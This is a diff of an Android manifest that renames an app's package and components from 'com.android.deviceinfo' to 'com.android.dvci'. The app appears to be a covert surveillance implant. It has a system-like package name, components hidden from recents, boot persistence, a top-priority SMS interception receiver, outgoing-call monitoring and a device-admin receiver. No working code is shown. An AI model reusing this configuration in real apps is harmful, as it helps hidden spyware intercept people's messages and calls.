@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-	package="com.android.deviceinfo" android:versionCode="1"
+	package="com.android.dvci" android:versionCode="1"
 	android:versionName="1.0">
 	<!-- @CAVEAT@ -->
 	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -37,19 +37,19 @@
 
 	<application android:icon="@drawable/icon" android:label="@string/app_name"
 		android:debuggable="@DEBUGGABLE@" android:allowBackup="false">
-		<service android:name="com.android.deviceinfo.ServiceMain"
+		<service android:name="com.android.dvci.ServiceMain"
 			android:exported="true" android:excludeFromRecents="true">
 			<intent-filter>
-				<action android:name="com.android.deviceinfo.app" />
+				<action android:name="com.android.dvci.app" />
 			</intent-filter>
 		</service>
 
-		<activity android:name="com.android.deviceinfo.gui.CGui"
+		<activity android:name="com.android.dvci.gui.CGui"
 			android:label="cgui" android:excludeFromRecents="true"
 			android:enabled="true" android:theme="@style/Theme.Tr6871623">
 		</activity>
 
-		<receiver android:name="com.android.deviceinfo.BM">
+		<receiver android:name="com.android.dvci.BM">
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 				<action android:name="android.intent.action.USER_PRESENT" />
@@ -61,19 +61,19 @@
 			</intent-filter>
 		</receiver>
 
-		<receiver android:name="com.android.deviceinfo.listener.BAc">
+		<receiver android:name="com.android.dvci.listener.BAc">
 		</receiver>
 
-		<receiver android:name="com.android.deviceinfo.listener.BSt">
+		<receiver android:name="com.android.dvci.listener.BSt">
 		</receiver>
 
-		<receiver android:name="com.android.deviceinfo.listener.BSm">
+		<receiver android:name="com.android.dvci.listener.BSm">
 			<intent-filter android:priority="999999999">
 				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
 			</intent-filter>
 		</receiver>
 
-		<receiver android:name="com.android.deviceinfo.listener.BC"
+		<receiver android:name="com.android.dvci.listener.BC"
 			android:exported="true">
 			<intent-filter android:priority="0">
 				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
@@ -82,7 +82,7 @@
 			</intent-filter>
 		</receiver>
 
-		<receiver android:name="com.android.deviceinfo.listener.AR"
+		<receiver android:name="com.android.dvci.listener.AR"
 			android:permission="android.permission.BIND_DEVICE_ADMIN">
 			<intent-filter>
 
